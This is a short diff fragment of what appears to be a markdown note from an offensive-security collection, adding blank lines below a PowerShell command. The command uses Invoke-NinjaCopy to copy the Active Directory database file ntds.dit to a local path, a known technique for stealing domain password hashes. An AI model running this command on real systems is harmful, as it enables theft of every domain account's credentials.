@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:43.691133+00:00'
 ```bash
 Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
 ```
+
+
